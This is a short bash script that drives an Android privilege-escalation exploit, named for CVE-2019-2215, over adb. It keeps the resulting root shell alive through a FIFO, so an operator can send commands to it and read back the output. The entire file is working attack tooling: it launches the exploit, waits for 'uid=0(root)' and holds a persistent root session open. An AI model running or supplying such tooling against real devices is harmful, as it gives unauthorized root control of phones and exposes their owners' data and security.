#!/bin/bash
# Persistent root shell over adb, driven through a FIFO.
#
# The exploit opens /system/bin/sh -p, but that shell dies when its stdin ends.
# Holding the FIFO's write end open keeps the root shell alive between calls.
#
#   write commands:   echo 'cmd' >  /tmp/root.in
#   read output:      cat /tmp/root.out   (or tail it)
#
# The FIFO write end is kept open by this script (exec 9>), so the shell stays up.
set -u

IN=/tmp/root.in
OUT=/tmp/root.out
EXP=/data/local/tmp/cve-2019-2215

rm -f "$IN" "$OUT"
mkfifo "$IN"
: > "$OUT"

echo "### starting the exploit, holding stdin open"
# ADB_TRACE off; the exploit prints progress to stderr.
adb shell "$EXP" < "$IN" >> "$OUT" 2>&1 &
EXP_PID=$!
echo "### exploit pid: $EXP_PID"

# Keep the write end open for the lifetime of this script.
exec 9> "$IN"

# Wait for the root shell to appear in the output.
for i in $(seq 1 60); do
  if grep -q "uid=0(root)" "$OUT" 2>/dev/null; then
    echo "### ROOT SHELL UP (after ${i}s)"
    break
  fi
  sleep 1
done

if ! grep -q "uid=0(root)" "$OUT" 2>/dev/null; then
  echo "### exploit did not report root; last output:"
  tail -20 "$OUT"
fi

# Sit here holding the FIFO open. Kill this script to close the session.
echo "### ready. commands: echo 'cmd' > $IN   |   output: $OUT"
while kill -0 "$EXP_PID" 2>/dev/null; do
  sleep 5
done
echo "### exploit process exited; session over"
exec 9>&-
